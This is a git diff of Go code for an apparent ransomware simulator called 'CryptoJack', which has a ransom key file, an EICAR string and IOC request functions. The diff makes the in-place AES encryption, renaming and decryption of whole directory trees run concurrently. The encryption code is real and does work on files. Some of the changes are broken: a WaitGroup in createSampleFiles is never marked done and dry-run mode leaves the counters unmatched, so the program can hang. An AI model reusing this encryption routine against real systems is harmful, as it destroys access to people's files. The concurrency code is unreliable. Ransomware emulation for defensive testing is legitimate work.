@@ -34,7 +34,7 @@ const RANSOM_KEY_FILE = "__RansomKey__.txt"
 const HASHDB_FILE = ".CryptoJack.Hashes.db"
 const UNIX_PRIVKEY_FILE = ".CryptoJack.rsaPrivKey"
 const UNIX_ENCKEY_FILE = ".CryptoJack.aesEncKey"
-const NFILE_MAX = 20
+const NFILE_MAX = 50
 const NDIR_MAX = 30
 const EICAR = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
 
@@ -81,7 +81,8 @@ func xorstr(buf []byte, k []byte) []byte {
 }
 
 func Request_IOC_Commands(config YAML_CONFIG) {
-    wg := sync.WaitGroup{}
+    //wg := sync.WaitGroup{}
+    var wg sync.WaitGroup
     ch := make(chan string)
     wg.Add(len(config.Command))
     for _, c := range config.Command {
@@ -99,7 +100,7 @@ func Request_IOC_Commands(config YAML_CONFIG) {
 }
 
 func Request_IOC_HTTP(config YAML_CONFIG) {
-    wg := sync.WaitGroup{}
+    var wg sync.WaitGroup
     ch := make(chan string)
     wg.Add(len(config.Web_requests))
     fmt.Printf("[*] Sending %d HTTP Requests\n", len(config.Web_requests))
@@ -206,36 +207,30 @@ func EncryptDirectoryStructure(
 	}
 
 	// main loop for encrypting files
+    var wg sync.WaitGroup
+    ch := make(chan string)
+    wg.Add(len(files))
 	for _, file := range files {
 		if dryrun {
 			fmt.Printf("[+] Dry-Run %d/%d: %s\n", totalfiles, len(files), file)
 		} else {
-			data, err := ioutil.ReadFile(file)
-            sha256hash := sha256.Sum256(data)
-			if err != nil {
-				skipped++
-				continue
-			}
-			encData, err := encryptData(data, &aeskey)
-			if err != nil {
-				skipped++
-				continue
-			}
-			err = ioutil.WriteFile(file, encData, 0644)
-			if err != nil {
-				skipped++
-				continue
-			}
-			encrypted++
-			log.Println(fmt.Sprintf("ENCRYPTED %d/%d: %s", totalfiles+1, len(files), file))
-            InsertFilePathHash(dbh, file, fmt.Sprintf("%x", sha256hash))
-			// rename file to include NEW file extension
-			if !norename {
-				os.Rename(file, file+newext)
-			}
+            go encryptFile(file, aeskey, norename, newext, ch, &wg)
 		}
 		totalfiles++
 	}
+
+    // wait and then close channel
+    go func() {
+        wg.Wait()
+        close(ch)
+    }()
+
+    for m := range(ch) {
+        temp := strings.Split(m, ":::")
+        fmt.Printf("ENCRYPTED [%d/%d]: %s\n", encrypted, totalfiles, temp[0])
+        InsertFilePathHash(dbh, temp[0], temp[1])
+        encrypted++
+    }
 
 	if !dryrun {
 		fmt.Printf("\n[*] %d files encrypted. %d files skipped.\n", totalfiles, skipped)
@@ -258,6 +253,22 @@ func EncryptDirectoryStructure(
 	return totalfiles, encrypted, skipped, nil
 }
 
+func encryptFile(file string, aeskey [32]byte, norename bool, newext string,
+                 ch chan<-string, wg *sync.WaitGroup) {
+    defer wg.Done()
+    data, err := ioutil.ReadFile(file)
+    if err != nil { return }
+    sha256hash := sha256.Sum256(data)
+    encData, err := encryptData(data, &aeskey)
+    if err != nil { return }
+    err = ioutil.WriteFile(file, encData, 0644)
+    if err != nil { return }
+    if !norename {
+        os.Rename(file, file+newext)
+    }
+    ch <- fmt.Sprintf("%s:::%x", file, sha256hash)
+}
+
 func DecryptDirectoryStructure(startdir string, ext string, norename bool, dryrun bool) (int, int, int, error) {
 	// setup starting dir
 	if len(startdir) == 0 {
@@ -274,55 +285,46 @@ func DecryptDirectoryStructure(startdir string, ext string, norename bool, dryru
 	var skipped int = 0
 
     dbh := ConnectDB(path.Join(startdir, HASHDB_FILE))
-	aesKey := fetchDecryptKey(startdir)
+	aeskey := fetchDecryptKey(startdir)
 	err := filepath.Walk(startdir, visitFilePath(&files, &skipped, nil))
 	if err != nil {
 		return 0, 0, 0, err
 	}
 
-	// main loop for encrypting files
+    // decrypt loop
+    var wg sync.WaitGroup
+    ch := make(chan string)
+    wg.Add(len(files))
 	for _, file := range files {
 		if dryrun {
 			fmt.Printf("[+] Dry-Run %d/%d: %s\n", totalfiles, len(files), file)
 		} else {
-			data, err := ioutil.ReadFile(file)
-			if err != nil {
-				log.Println(file + ":" + err.Error())
-				skipped++
-				continue
-			}
-			decData, err := decryptData(data, &aesKey)
-			if err != nil {
-				log.Println(file + ":" + err.Error())
-				skipped++
-				continue
-			}
-			err = ioutil.WriteFile(file, decData, 0644)
-			if err != nil {
-				log.Println(file + ":" + err.Error())
-				skipped++
-				continue
-			}
-
-            sha256hash1 := fmt.Sprintf("%x", sha256.Sum256(decData))
-            sha256hash2 := GetFilePathHash(dbh, file[:len(file)-len(filepath.Ext(file))])
-            result := ""
-            if len(sha256hash2) == 0 {
-                result = "Hash Not Found"
-            } else if sha256hash1 == sha256hash2 {
-                result = "OK"
-            } else if sha256hash1 != sha256hash2 {
-                result = "Hash Mismatch"
-            }
-
-			decrypted++
-			log.Println(fmt.Sprintf("DECRYPTED %d/%d: %s (%s)", totalfiles+1, len(files), file, result))
-			if !norename && filepath.Ext(file) == ext {
-				os.Rename(file, file[:len(file)-len(filepath.Ext(file))])
-			}
+            go decryptFile(file, aeskey, norename, ext, ch, &wg)
 		}
 		totalfiles++
 	}
+
+    // wait and then close channel
+    go func() {
+        wg.Wait()
+        close(ch)
+    }()
+
+    for m := range(ch) {
+        temp := strings.Split(m, ":::")
+        file := temp[0]
+        sha256hash := temp[1]
+        fmt.Printf("DECRYPTED [%d/%d]: %s", decrypted, totalfiles, file)
+        db_sha256hash := GetFilePathHash(dbh, file[:len(file)-len(filepath.Ext(file))])
+        if len(db_sha256hash) == 0 {
+            fmt.Println(" (Hash Not Found)")
+        } else if sha256hash == db_sha256hash {
+            fmt.Println(" (OK)")
+        } else {
+            fmt.Println(" (Hash MisMatch)")
+        }
+        decrypted++
+    }
 
 	if !dryrun {
 		fmt.Printf("\n[*] %d files decrypted. %d files skipped.\n", totalfiles, skipped)
@@ -334,6 +336,22 @@ func DecryptDirectoryStructure(startdir string, ext string, norename bool, dryru
 	}
 	return totalfiles, decrypted, skipped, nil
 }
+
+func decryptFile(file string, aeskey [32]byte, norename bool,
+            ext string, ch chan<-string, wg *sync.WaitGroup) {
+    defer wg.Done()
+    data, err := ioutil.ReadFile(file)
+    if err != nil { return }
+    decData, err := decryptData(data, &aeskey)
+    if err != nil { return }
+    err = ioutil.WriteFile(file, decData, 0644)
+    if err != nil { return }
+    if !norename && filepath.Ext(file) == ext {
+        os.Rename(file, file[:len(file)-len(filepath.Ext(file))])
+    }
+    ch <- fmt.Sprintf("%s:::%x", file, sha256.Sum256(decData))
+}
+
 
 func FakeData(directory string, depth int, msg chan string) {
 	dirs, files := createDirectoryStructure(directory, depth)
@@ -398,11 +416,14 @@ func visitFilePath(files *[]string, skipcount *int, exclude []string) filepath.W
 }
 
 func createSampleFiles(directory string) int {
-	n := rand.Intn(NFILE_MAX)
+    var wg sync.WaitGroup
+	n := 10 + rand.Intn(NFILE_MAX)
+    wg.Add(n)
 	for i := 0; i < n; i++ {
-		createExcelFile(directory)
-		createPDFFile(directory)
+		go createExcelFile(directory)
+		go createPDFFile(directory)
 	}
+    wg.Wait()
 	return n * 2
 }
 
